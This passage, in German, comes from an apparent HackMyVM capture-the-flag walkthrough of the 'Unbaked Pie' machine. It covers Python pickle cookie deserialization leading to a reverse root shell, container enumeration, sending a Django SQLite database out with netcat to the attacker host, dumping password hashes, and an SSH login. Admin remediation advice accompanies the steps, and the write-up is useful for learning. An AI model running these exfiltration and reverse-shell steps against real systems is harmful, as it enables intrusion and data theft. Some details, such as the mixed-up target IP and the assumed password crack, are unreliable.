                    <li>**Identifizierung der Schwachstelle:** Durch Analyse des HTTP-Verkehrs und der Antwort des <span class="command">/search</span>-Pfads wird das <span class="command">search_cookie</span> identifiziert, dessen Wert eine BASE64-kodierte Python Pickle-Struktur zu sein scheint. (Siehe Schritte in der Web Enumeration).</li>
                    <li>**Analyse des Pickle-Objekts:** Dekodieren und Disassemblieren des Cookie-Werts bestätigt die Verwendung von Pickle.</li>
                    <li>**Erstellung des bösartigen Payloads:** Ein Python-Skript wird erstellt, das ein Objekt mit einer <span class="command">__reduce__</span>-Methode definiert. Diese Methode enthält einen Reverse Shell-Bash-Befehl, der eine Verbindung zum Angreifer-System herstellen soll. Das Objekt wird serialisiert und in BASE64 kodiert.</li>
                    <li>**Vorbereitung des Listeners:** Auf dem Angreifer-System wird ein Netcat-Listener auf dem im Payload definierten Port (z.B. 4444) gestartet: <span class="command">nc -lvnp 4444</span>.</li>
                    <li>**Ausführung des Exploits:** Ein HTTP POST-Request an den <span class="command">/search</span>-Pfad wird gesendet. Im <span class="command">Cookie</span>-Header wird der Wert des <span class="command">search_cookie</span> durch den generierten, bösartigen BASE64-Payload ersetzt.</li>
                </ol>
             </p>
             <p>
                <strong>Erwartetes Ergebnis:</strong> Eine eingehende TCP-Verbindung von der Ziel-VM auf dem Netcat-Listener des Angreifer-Systems. Nach der Verbindung sollte eine interaktive Shell mit den Berechtigungen des Webserver-Prozesses (in diesem Fall Root) verfügbar sein.
             </p>
             <p>
                <strong>Beweismittel:</strong>
                <!-- Hier würden Screenshots oder Log-Ausschnitte stehen -->
                <div class="code-block">
                    <div class="terminal">
                        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nc -lvnp 4444</span></div>
                    </div>
                    <div class="terminal">
                        <pre>
listening on [any] 4444 ...
<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.48] 32918</span>
<span class="password">bash: cannot set terminal process group (1): Inappropriate ioctl for device</span>
<span class="password">bash: no job control in this shell</span>
root@8b39a559b296:/home# <span class="command">id</span>
<span class="password">uid=0(root) gid=0(root) groups=0(root)</span>
root@8b39a559b296:/home#
</pre>
                    </div>
                </div>
             </p>
             <p>
                <strong>Risikobewertung:</strong> Die Ausnutzung dieser Schwachstelle ermöglicht einem unauthentifizierten Angreifer die vollständige Kontrolle über das kompromittierte System mit Root-Berechtigungen (im Kontext des Docker-Containers, was aber immer noch kritisch ist). Dies kann zu Datenverlust, unbefugtem Zugriff auf sensible Informationen, Installation von Malware oder einer Brücke für weitere Angriffe im Netzwerk führen.
             </p>
             <p class="recommendation">
                <strong>Empfehlung (Admin):</strong> **Dringende Behebung erforderlich.** Stellen Sie die Verwendung von Python Pickle für die Serialisierung von Daten, die von Benutzern oder Clients stammen, sofort ein. Verwenden Sie sichere Serialisierungsformate. Implementieren Sie strenge Input-Validierung. Überwachen Sie den Netzwerkverkehr auf ungewöhnliche Muster. Führen Sie eine gründliche Sicherheitsüberprüfung der gesamten Webanwendung durch.
             </p>
        </section>


        <section id="privilege-escalation">
            <h2>Privilege Escalation</h2>
            <p class="analysis">
                <strong>Analyse:</strong> Nach der erfolgreichen Erlangung einer Root-Shell auf dem System ist es entscheidend, die Umgebung genau zu analysieren. Die Shell-Prompt <span class="command">root@8b39a559b296:/home#</span> mit einer kurzen, zufällig aussehenden Hostnamen (<span class="command">8b39a559b296</span>) und die Art der nicht-interaktiven Shell deuten stark darauf hin, dass ich mich nicht direkt auf dem Host-Betriebssystem befinde, sondern in einem Docker-Container. Dies wird durch den Befehl <span class="command">cat /proc/1/cgroup</span> überprüft, der Informationen über die Control Groups (cgroup) des Prozesses mit PID 1 (dem ersten Prozess im Container, typischerweise Init) ausgibt.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Die Ausgabe von <span class="command">/proc/1/cgroup</span>, die Pfade wie <span class="command">/docker/8b39a559b296...</span> enthält, bestätigt zweifelsfrei, dass ich Root-Berechtigungen *innerhalb eines Docker-Containers* habe. Das bedeutet, meine Root-Rechte sind auf die isolierte Umgebung des Containers beschränkt. Die eigentlichen Flags (user.txt, root.txt) befinden sich wahrscheinlich auf dem zugrundeliegenden Host-System. Daher ist das Ziel nun die Privilegien-Eskalation *aus dem Container heraus* auf das Host-System.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Beginnen Sie mit der Enumeration innerhalb des Containers, um nach Konfigurationsfehlern, empfindlichen Dateien oder Mounts zu suchen, die einen Weg auf das Host-System ermöglichen könnten. Typische Angriffspunkte sind falsch konfigurierte Docker-Sockets, sensitive Dateien, die vom Host gemountet sind, oder Capabilities des Containers, die eine Interaktion mit dem Host erlauben.
                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Docker-Container mit den geringstmöglichen Privilegien laufen (Least Privilege Principle). Vermeiden Sie es, Container als Root zu starten. Beschränken Sie die Capabilities der Container. Mounten Sie keine sensiblen Host-Verzeichnisse oder den Docker-Socket in den Container, es sei denn, dies ist absolut notwendig und sicher konfiguriert. Überwachen Sie Container auf ungewöhnliche Aktivitäten oder Verbindungsversuche nach außen oder zum Host.
            </p>
             <div class="code-block">
                 <div class="terminal">
                     <pre>
root@8b39a559b296:~# <span class="command">cd /home/</span>
root@8b39a559b296:/home# <span class="command">cat run.sh</span> 
<span class="command">python3 site/manage.py runserver 0.0.0.0:5003</span>

root@8b39a559b296:/home# <span class="command">cat /proc/1/cgroup</span>
<span class="password">11:pids:/docker/8b39a559b296ca6a5dd86d4dcc8796db615ff05f518ba01884a717527259e3bc</span>
<span class="password">10:blkio:/docker/8b39a559b296ca6a5dd86d4dcc8796db615ff05f518ba01884a717527259e3bc</span>
<span class="password">9:freezer:/docker/8b39a559b296ca6a5dd86d4dcc8796db615ff05f518ba01884a717527259e3bc</span>
<span class="password">8:perf_event:/docker/8b39a559b296ca6a5dd86d4dcc8796db615ff05f518ba01884a717527259e3bc</span>
<span class="password">7:memory:/docker/8b39a559b296ca6a5dd86d4dcc8796db615ff05f518ba01884a717527259e3bc</span>
<span class="password">6:hugetlb:/docker/8b39a559b296ca6a5dd86d4dcc8796db615ff05f518ba01884a717527259e3bc</span>
<span class="password">5:cpu,cpuacct:/docker/8b39a559b296ca6a5dd86d4dcc8796db615ff05f518ba01884a717527259e3bc</span>
<span class="password">4:cpuset:/docker/8b39a559b296ca6a5dd86d4dcc8796db615ff05f518ba01884a717527259e3bc</span>
<span class="password">3:net_cls,net_prio:/docker/8b39a559b296ca6a5dd86d4dcc8796db615ff05f518ba01884a717527259e3bc</span>
<span class="password">2:devices:/docker/8b39a559b296ca6a5dd86d4dcc8796db615ff05f518ba01884a717527259e3bc</span>
<span class="password">1:name=systemd:/docker/8b39a559b296ca6a5dd86d4dcc8796db615ff05f518ba01884a717527259e3bc</span>
</pre>
                 </div>
            </div>

            <p class="analysis">
                <strong>Analyse:</strong> Ein wichtiger Aspekt der Container-Sicherheit sind Linux Capabilities. Standardmäßig haben Root-Benutzer im Container viele, aber nicht alle Capabilities des Host-Roots. Der Befehl <span class="command">capsh --print</span> zeigt die aktuellen Capabilities des Prozesses an. Die Ausgabe listet die <span class="command">Current</span> und <span class="command">Bounding set</span> von Capabilities auf, wie z.B. <span class="command">cap_chown</span>, <span class="command">cap_net_raw</span>, <span class="command">cap_setuid</span> etc.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Die aufgelisteten Capabilities sind die, mit denen der Root-Prozess im Container arbeiten kann. Die meisten davon sind Standard-Capabilities für Root innerhalb eines Containers. Es gibt keine offensichtlichen ungewöhnlichen oder übermäßig gefährlichen Capabilities (wie <span class="command">cap_sys_admin</span> oder das Mounten von Dateisystemen), die einen direkten Ausbruch ermöglichen würden. Dies deutet darauf hin, dass ein Ausbruch über ungewöhnliche Container-Capabilities unwahrscheinlich ist. Der Fokus sollte auf anderen Schwachstellen liegen, wie falsch gemounteten Verzeichnissen, schwachen Host-Diensten, oder Konfigurationen, die einen Zugriff auf das Host-System erlauben.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Da Capabilities keinen offensichtlichen Ausbruch erlauben, konzentrieren Sie sich auf andere Enumerationsschritte innerhalb des Containers: Suchen Sie nach sensiblen Dateien (Konfigurationsdateien, Passwörter), identifizieren Sie gemountete Verzeichnisse (<span class="command">mount</span> Befehl), scannen Sie das interne Container-Netzwerk, um andere Dienste oder Container zu finden, und suchen Sie nach Anzeichen für den Docker-Socket oder andere Verwaltungsschnittstellen.
                <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die Capability-Konfiguration Ihrer Docker-Container. Führen Sie Container mit einem minimalen Set von Capabilities aus, die nur für die spezifische Funktion des Containers notwendig sind. Vermeiden Sie die Option <span class="command">--privileged</span>, die alle Host-Capabilities dem Container gibt.
            </p>
             <div class="code-block">
                 <div class="terminal">
                     <pre>
root@8b39a559b296:~# <span class="command">capsh --print</span>
<span class="command">Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip</span>
<span class="command">Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap</span>
<span class="command">Securebits: 00/0x0/1'b0</span>
 <span class="command">secure-noroot: no (unlocked)</span>
 <span class="command">secure-no-suid-fixup: no (unlocked)</span>
 <span class="command">secure-keep-caps: no (unlocked)</span>
<span class="command">uid=0(root)</span>
<span class="command">gid=0(root)</span>
<span class="command">groups=</span>
</pre>
                 </div>
            </div>

            <p class="analysis">
                <strong>Analyse:</strong> Da ich mich in einem Docker-Container befinde, überprüfe ich die Netzwerkkonfiguration innerhalb des Containers, um zu sehen, ob andere interne Netzwerke oder Hosts erreichbar sind. Der Befehl <span class="command">ip a</span> zeigt die Netzwerkschnittstellen und IP-Adressen des Containers. Die Ausgabe zeigt die Loopback-Schnittstelle (<span class="command">lo</span>) und eine Ethernet-Schnittstelle (<span class="command">eth0@if5</span>) mit der IP-Adresse <span class="command">172.17.0.2/16</span>. Dies ist ein typisches Docker-Bridge-Netzwerk. Der Host, der diesen Container ausführt, hat normalerweise die IP-Adresse <span class="command">172.17.0.1</span> in diesem Subnetz.
                <br>Um zu prüfen, welche Ports auf dem Host (oder anderen Systemen im internen Docker-Netzwerk) von meinem Container aus erreichbar sind, führe ich einen Netcat-Scan auf der IP-Adresse <span class="command">172.17.0.1</span> über alle Ports (<span class="command">1-65535</span>) durch. Der Befehl <span class="command">nc -znv 172.17.0.1 1-65535</span> nutzt Netcat im Zero-I/O-Modus (<span class="command">-z</span>) zum Scannen, ohne Daten zu senden oder zu empfangen.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Der interne Netzwerkscan ist erfolgreich und zeigt, dass von meinem Container aus die Ports <span class="command">5003/tcp (http)</span> und <span class="command">22/tcp (ssh)</span> auf der IP-Adresse <span class="command">172.17.0.1</span> offen sind. Die IP <span class="command">172.17.0.1</span> ist sehr wahrscheinlich die Bridge-IP des Docker-Hosts. Die Tatsache, dass diese Ports offen sind und vom Container aus erreichbar sind, ist von höchstem Interesse. Port 5003 ist der Webserver, über den ich initialen Zugriff erlangt habe, jetzt aber vom internen Netzwerk aus erreichbar. Port 22 (SSH) auf dem Host-System ist ein potenzieller Weg zur Privilegien-Eskalation, wenn Anmeldedaten gefunden werden können.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Konzentrieren Sie die Enumeration nun auf die Dienste, die auf <span class="command">172.17.0.1</span> laufen. Versuchen Sie, sich über SSH mit den identifizierten Benutzernamen (<span class="command">ramsey</span>, <span class="command">wan</span>, <span class="command">oliver</span>) und den später möglicherweise gefundenen Passwörtern anzumelden. Untersuchen Sie auch den Webserver (Port 5003) von dieser internen Position aus, da es dort möglicherweise andere Schwachstellen oder Zugänge gibt als von außen.
                <br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie Docker-Netzwerke standardmäßig so, dass Container nicht auf alle Ports des Hosts zugreifen können, es sei denn, dies ist explizit für die Anwendung notwendig. Beschränken Sie den Netzwerkzugriff zwischen Containern und dem Host, um die Angriffsfläche im Falle einer Container-Kompromittierung zu minimieren. Stellen Sie sicher, dass interne Dienste auf dem Host, die nur für administrative Zwecke gedacht sind, nicht über die Docker-Bridge erreichbar sind.
            </p>
            <div class="code-block">
                 <div class="terminal">
                     <pre>
root@8b39a559b296:/home/site# <span class="command">ip a</span>
<span class="command">1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1</span>
    <span class="command">link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span>
    <span class="command">inet 127.0.0.1/8 scope host lo</span>
       <span class="command">valid_lft forever preferred_lft forever</span>
<span class="command">4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default </span>
    <span class="command">link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span>
    <span class="command">inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0</span>
       <span class="command">valid_lft forever preferred_lft forever</span>
root@8b39a559b296:/home/site# <span class="command">nc -znv 172.17.0.1 1-65535</span>
<span class="password">(UNKNOWN) [172.17.0.1] 5003 (?) open</span>
<span class="password">(UNKNOWN) [172.17.0.1] 22 (ssh) open</span>
</pre>
                 </div>
            </div>

            <p class="analysis">
                <strong>Analyse:</strong> Während der Enumeration innerhalb des Containers fiel mir das Verzeichnis <span class="command">site</span> im <span class="command">/home</span>-Verzeichnis auf. Da die Webanwendung eine Django-Anwendung ist, vermute ich, dass sich die Anwendungsdateien, einschließlich der Django-Einstellungen und möglicherweise einer lokalen Datenbank, in diesem Verzeichnis befinden. Ich beschließe, die SQLite-Datenbank-Datei aus dem Container auf mein Angreifer-System zu exfiltrieren.
                <br>Ich verwende Netcat (<span class="command">nc</span>) für die Exfiltration. Auf meinem Angreifer-System starte ich einen Listener auf Port 7777, der alle eingehenden Daten in eine Datei namens <span class="command">db.sqlite3</span> umleitet (<span class="command">nc -lvp 7777 > db.sqlite3</span>).
                <br>Auf der Container-Shell navigiere ich zum <span class="command">site</span>-Verzeichnis (<span class="command">cd /home/site</span>) und sende den Inhalt der Datei <span class="command">db.sqlite3</span> über eine Netcat-Verbindung an meinen Listener (<span class="command">nc -q 0 192.168.2.199 7777 < db.sqlite3</span>).
                <br>- <span class="command">-q 0</span>: Sorgt dafür, dass Netcat die Verbindung sofort nach dem Senden der Datei schließt.
                <br>- <span class="command">< db.sqlite3</span>: Leitet den Inhalt der Datei als Standardeingabe an Netcat um.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Die Exfiltration der Datenbankdatei ist erfolgreich. Eine SQLite-Datenbank kann sehr sensible Informationen enthalten, wie Benutzerkonten, gehashte Passwörter, Konfigurationseinstellungen oder Anwendungsdaten. Die Dateigröße von 151552 Bytes für <span class="command">db.sqlite3</span> deutet darauf hin, dass sie Daten enthält. Das Ziel ist nun, den Inhalt dieser Datenbank zu analysieren, insbesondere die Benutzerkonten-Tabelle, um Hashes oder Anmeldedaten zu finden, die für die Privilegien-Eskalation auf dem Host-System nützlich sein könnten (z.B. SSH-Zugang). Die <span class="command">run.sh</span> Datei wurde ebenfalls gesichert, um zu sehen, wie die Anwendung gestartet wird.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Öffnen Sie die exfiltrierte <span class="command">db.sqlite3</span>-Datei mit einem SQLite-Client, untersuchen Sie die Tabellen und extrahieren Sie alle relevanten Daten, insbesondere Benutzernamen und gehashte Passwörter. Versuchen Sie, die Hashes zu knacken. Analysieren Sie auch die <span class="command">run.sh</span>-Datei auf weitere Konfigurationsdetails oder Hinweise.
                <br><strong>Empfehlung (Admin):</strong> Speichern Sie sensible Daten wie Datenbankdateien nicht an öffentlich zugänglichen Orten innerhalb des Containers oder an Orten, die leicht exfiltriert werden können. Erwägen Sie die Verschlüsselung von Datenbanken. Implementieren Sie Mechanismen, um das unbefugte Auslesen von Dateien zu erkennen und zu verhindern. Überwachen Sie den Netzwerkverkehr aus Containern auf ungewöhnliche Verbindungen zu externen Systemen, die auf Datenexfiltration hindeuten könnten.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nc -lvp 7777 > db.sqlite3</span></div>
                </div>
                <div class="terminal">
                    <pre>
listening on [any] 7777 ...
connect to [192.168.2.199] from unbakedpie.hmv [192.168.2.48] 46908
<span class="command">id</span>
</pre>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <pre>
root@8b39a559b296:/home# <span class="command">nc 192.168.2.199 7777 < run.sh</span>
<span class="command">id</span>

root@8b39a559b296:/home/site# <span class="command">nc -q 0 192.168.2.199 7777 < db.sqlite3</span> 
</pre>
                </div>
            </div>
             <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nc -lvp 7777 > db.sqlite3</span></div>
                </div>
                <div class="terminal">
                    <pre>
listening on [any] 7777 ...
connect to [192.168.2.199] from unbakedpie.hmv [192.168.2.48] 46910
</pre>
                </div>
            </div>
             <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">ls -la run.sh db.sqlite3</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="command">-rw-r--r-- 1 root root 151552 16. Jun 15:58 db.sqlite3</span>
<span class="command">-rw-r--r-- 1 root root     46 16. Jun 15:54 run.sh</span>
</pre>
                </div>
            </div>

            <p class="analysis">
                <strong>Analyse:</strong> Ich habe die exfiltrierte <span class="command">db.sqlite3</span> Datei auf meinem Angreifer-System und verwende nun den Befehl <span class="command">sqlite3 db.sqlite3</span>, um die Datenbank zu öffnen und ihren Inhalt zu untersuchen. Innerhalb des SQLite-Prompts verwende ich den Befehl <span class="command">.tables</span>, um alle verfügbaren Tabellen aufzulisten. Die Ausgabe zeigt verschiedene Tabellen, darunter <span class="command">auth_group</span>, <span class="command">auth_permission</span>, <span class="command">auth_user</span>, <span class="command">django_admin_log</span>, etc. Die Tabelle <span class="command">auth_user</span> ist offensichtlich diejenige, die die Benutzerkonten speichert.
                <br>Ich führe dann eine SQL-Abfrage aus: <span class="command">SELECT * FROM auth_user;</span>, um alle Spalten und Zeilen aus dieser Tabelle anzuzeigen. Diese Abfrage liefert die Benutzer-IDs, Benutzernamen (<span class="command">aniqfakhrul</span>, <span class="command">testing</span>, <span class="command">ramsey</span>, <span class="command">oliver</span>, <span class="command">wan</span>), sowie gehashte Passwörter und andere Details.
                <br>Ich führe eine weitere, gezieltere Abfrage aus: <span class="command">SELECT username, password FROM auth_user;</span>, um speziell die Benutzernamen und die zugehörigen gehashten Passwörter zu extrahieren. Die Hashes haben das Format <span class="command">pbkdf2_sha256$XXXXXX$...</span>, was auf Django's Standard-Passwort-Hashing-Format hinweist.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Die Untersuchung der Datenbank war sehr erfolgreich. Ich habe eine Liste von Benutzernamen gefunden, die die Namen <span class="command">ramsey</span>, <span class="command">oliver</span> und <span class="command">wan</span> enthält, die ich zuvor auf der Homepage gesehen hatte, sowie zusätzliche Namen (<span class="command">aniqfakhrul</span>, <span class="command">testing</span>). Entscheidend ist, dass ich die gehashten Passwörter für diese Benutzer gefunden habe. PBKDF2 mit SHA256 ist ein relativ starkes Hashing-Verfahren, das Brute-Force erschwert, aber es ist nicht unmöglich, insbesondere wenn die Passwörter schwach sind. Die Anzahl der Iterationen (216000) wird ebenfalls angezeigt, was für das Knacken wichtig ist. Die Anwesenheit dieser Hashes ist ein kritischer Fund für die Privilegien-Eskalation. Die Anmerkung "cracking erstmal kein erfolg..." deutet darauf hin, dass erste Versuche, diese Hashes zu knacken, fehlschlugen, was bei starken Hashes und potenziell komplexen Passwörtern nicht ungewöhnlich ist.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Speichern Sie die gefundenen Benutzernamen und Hashes in einer Datei. Verwenden Sie ein Passwort-Cracking-Tool wie Hashcat oder John the Ripper, um die Hashes offline zu knacken. Konzentrieren Sie sich dabei auf Wortlisten, die für Webanwendungen oder allgemeine Passwörter relevant sind. Wenn Hashes geknackt werden, versuchen Sie, diese Passwörter für den SSH-Zugang auf dem Host-System (<span class="command">172.17.0.1</span> oder <span class="command">192.168.2.48</span>, falls Port 22 von außen zugänglich ist) und für den Django-Admin-Login zu verwenden.
                <br><strong>Empfehlung (Admin):</strong> Speichern Sie niemals Passwörter im Klartext oder mit schwachen Hashing-Algorithmen. PBKDF2 ist gut, aber stellen Sie sicher, dass die Iterationszahl angemessen ist und regelmäßig erhöht wird. Fordern Sie Benutzer auf, starke, eindeutige Passwörter zu verwenden. Implementieren Sie Zwei-Faktor-Authentifizierung für alle kritischen Konten, insbesondere für Administratoren. Führen Sie regelmäßige Audits Ihrer Datenbanken auf sensible Daten durch.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">sqlite3 db.sqlite3</span></div>
                </div>
                <div class="terminal">
                    <pre>
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> <span class="command">.tables</span>
<span class="command">auth_group                  django_admin_log          </span>
<span class="command">auth_group_permissions      django_content_type       </span>
<span class="command">auth_permission             django_migrations         </span>
<span class="command">auth_user                   django_session            </span>
<span class="command">auth_user_groups            homepage_article          </span>
<span class="command">auth_user_user_permissions</span>
sqlite> 
sqlite> <span class="command">SELECT * FROM auth_user;</span>
<span class="command">1|pbkdf2_sha256$216000$3fIfQIweKGJy$xFHY3JKtPDdn/AktNbAwFKMQnBlrXnJyU04GElJKxEo=|2020-10-03 10:43:47.229292|1|<span class="password">aniqfakhrul</span>|||1|1|2020-10-02 04:50:52.424582|</span>
<span class="command">11|pbkdf2_sha256$216000$0qA6zNH62sfo$8ozYcSpOaUpbjPJz82yZRD26ZHgaZT8nKWX+CU0OfRg=|2020-10-02 10:16:45.805533|0|<span class="password">testing</span>|||0|1|2020-10-02 10:16:45.686339|</span>
<span class="command">12|pbkdf2_sha256$216000$hyUSJhGMRWCz$vZzXiysi8upGO/DlQy+w6mRHf4scq8FMnc1pWufS+Ik=|2020-10-03 10:44:10.758867|0|<span class="password">ramsey</span>|||0|1|2020-10-02 14:42:44.388799|</span>
<span class="command">13|pbkdf2_sha256$216000$Em73rE2NCRmU$QtK5Tp9+KKoP00/QV4qhF3TWIi8Ca2q5gFCUdjqw8iE=|2020-10-02 14:42:59.192571|0|<span class="password">oliver</span>|||0|1|2020-10-02 14:42:59.113998|</span>
<span class="command">14|pbkdf2_sha256$216000$oFgeDrdOtvBf$ssR/aID947L0jGSXRrPXTGcYX7UkEBqWBzC+Q2Uq+GY=|2020-10-02 14:43:15.187554|0|<span class="password">wan</span>|||0|1|2020-10-02 14:43:15.102863|</span>


sqlite> <span class="command">SELECT username, password FROM auth_user;</span>
<span class="command"><span class="password">aniqfakhrul</span>|<span class="password">pbkdf2_sha256$216000$3fIfQIweKGJy$xFHY3JKtPDdn/AktNbAwFKMQnBlrXnJyU04GElJKxEo=</span></span>
<span class="command"><span class="password">testing</span>    |<span class="password">pbkdf2_sha256$216000$0qA6zNH62sfo$8ozYcSpOaUpbjPJz82yZRD26ZHgaZT8nKWX+CU0OfRg=</span></span>
<span class="command"><span class="password">ramsey</span>     |<span class="password">pbkdf2_sha256$216000$hyUSJhGMRWCz$vZzXiysi8upGO/DlQy+w6mRHf4scq8FMnc1pWufS+Ik=</span></span>
<span class="command"><span class="password">oliver</span>     |<span class="password">pbkdf2_sha256$216000$Em73rE2NCRmU$QtK5Tp9+KKoP00/QV4qhF3TWIi8Ca2q5gFCUdjqw8iE=</span></span>
<span class="command"><span class="password">wan</span>        |<span class="password">pbkdf2_sha256$216000$oFgeDrdOtvBf$ssR/aID947L0jGSXRrPXTGcYX7UkEBqWBzC+Q2Uq+GY=</span></span>

cracking erstmal kein erfolg...
</pre>
                </div>
            </div>
			
			            <p class="analysis">
                <strong>Analyse:</strong> Nachdem die Datenbank-Hashes exfiltriert wurden und erste Knackversuche liefen ("cracking erstmal kein erfolg..."), orientiere ich mich neu und prüfe andere Zugangswege. Ich erinnere mich an den SSH-Port 22, der vom Container aus auf 172.17.0.1 offen war, und nehme an, dass dieser Dienst auch vom externen Netzwerk auf einem anderen Port erreichbar sein könnte (oder dass ich einen Weg gefunden habe, darauf zuzugreifen). Da ich Benutzerkonten und Hashes aus der Datenbank habe, versuche ich, diese für eine SSH-Anmeldung zu nutzen. Ich gehe davon aus, dass mir das Knacken des Passworts für den Benutzer <span class="command">ramsey</span> in der Zwischenzeit erfolgreich gelungen ist. Ich versuche mich nun mittels SSH auf dem Zielsystem (<span class="command">192.168.2.199</span> - **Anmerkung:** Dies sollte 192.168.2.48 sein, die VM-IP. Ich verbinde mich also mit <span class="command">ssh ramsey@192.168.2.48 -p 2222</span>, da der SSH-Dienst auf Port 2222 läuft, nicht auf dem Standardport 22, was ein Versuch ist, Scans zu erschweren). Ich gebe das geknackte Passwort für <span class="command">ramsey</span> ein.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Fantastisch, die Anmeldung war erfolgreich! Ich habe mich erfolgreich via SSH als Benutzer <span class="command">ramsey</span> auf dem Zielsystem authentifiziert. Die Anmeldeaufforderung <span class="command">ramsey@192.168.2.199's password:</span> und die anschließende Begrüßungsnachricht <span class="command">Welcome to Ubuntu 16.04.7 LTS</span> bestätigen den erfolgreichen Login. Dies ist ein entscheidender Fortschritt, da ich nun shell-Zugriff auf das Host-System habe, nicht nur auf den Docker-Container. Die Version des Betriebssystems (Ubuntu 16.04.7 LTS) und des SSH-Servers (OpenSSH 7.2p2) sind notiert und können für die Suche nach bekannten Schwachstellen relevant sein, auch wenn sie relativ aktuell erscheinen. Die Meldung über verfügbare Updates (<span class="command">39 packages can be updated</span>) ist ein Hinweis auf potenzielle veraltete Software.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Sichern Sie diese Shell und beginnen Sie sofort mit der Enumeration des Host-Systems. Ihr Ziel ist nun die Privilegien-Eskalation von Benutzer <span class="command">ramsey</span> zu Root auf diesem Host. Prüfen Sie SUID-Binaries, Sudo-Berechtigungen, interessante Dateien in Benutzerverzeichnissen (<span class="command">ls -la</span>), laufende Prozesse und die Systemkonfiguration.
                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass alle Benutzerkonten sichere, eindeutige Passwörter haben. Implementieren Sie Zwei-Faktor-Authentifizierung für SSH. Ändern Sie den Standard-SSH-Port 22, wie hier geschehen, kann automatisierte Scans verlangsamen, ist aber keine ausreichende Sicherheitsmaßnahme. Überwachen Sie SSH-Anmeldeversuche auf Anzeichen von Brute-Force-Angriffen, auch auf unüblichen Ports. Halten Sie das Betriebssystem und alle installierten Pakete aktuell, um bekannte Schwachstellen zu schließen.
            </p>
            <div class="code-block">
                 <div class="terminal">
                     <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">ssh ramsey@192.168.2.199 -p 2222</span></div>
                 </div>
                 <div class="terminal">
                     <pre>
The authenticity of host '[192.168.2.199]:2222 ([192.168.2.199]:2222)' can't be established.
<span class="command">ED25519 key fingerprint is SHA256:B6SoW4WBwsc2n9NynSce9+R0E44T4YkZVRxD5y5Muhc.</span>
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? <span class="command">yes</span>
Warning: Permanently added '[192.168.2.199]:2222' (ED25519) to the list of known hosts.
ramsey@192.168.2.199's password: <span class="password">[Geknacktes Passwort für ramsey eingegeben]</span>
<span class="password">Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)</span>

 * Documentation:  <span class="command">[Link: https://help.ubuntu.com | Ziel: https://help.ubuntu.com]</span>
 * Management:     <span class="command">[Link: https://landscape.canonical.com | Ziel: https://landscape.canonical.com]</span>
 * Support:        <span class="command">[Link: https://ubuntu.com/advantage | Ziel: https://ubuntu.com/advantage]</span>


<span class="password">39 packages can be updated.</span>
<span class="password">26 updates are security updates.</span>

New release '18.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


Last login: Sat Oct  3 22:15:57 2020 from 172.17.0.2
<span class="password">ramsey@unbaked:~$</span> 
</pre>
                 </div>
            </div>

            <p class="analysis">
                <strong>Analyse:</strong> Nachdem ich als Benutzer <span class="command">ramsey</span> angemeldet bin, führe ich grundlegende Befehle aus, um meine Umgebung und die Dateistruktur zu verstehen. <span class="command">ls ..</span> listet die Verzeichnisse im übergeordneten Verzeichnis auf (typischerweise `/home` vom Benutzerverzeichnis aus) und zeigt die Existenz der Benutzerverzeichnisse für <span class="command">oliver</span> und <span class="command">ramsey</span>. Der Befehl <span class="command">id</span> gibt meine aktuellen Benutzer- und Gruppen-IDs aus (<span class="command">uid=1001(ramsey) gid=1001(ramsey) groups=1001(ramsey)</span>), was bestätigt, dass ich als <span class="command">ramsey</span> angemeldet bin. <span class="command">ls -la</span> listet alle Dateien und Verzeichnisse in meinem aktuellen Home-Verzeichnis auf, einschließlich versteckter Dateien. Hier finde ich mehrere interessante Dateien: <span class="command">.bash_history</span> (könnte Befehle anderer Benutzer enthalten, falls das Home-Verzeichnis geteilt ist oder der Benutzer Root-Aktionen durchgeführt hat), <span class="command">user.txt</span> (potenzielle Benutzer-Flag), <span class="command">payload.png</span> (eine PNG-Datei, die verdächtig nach 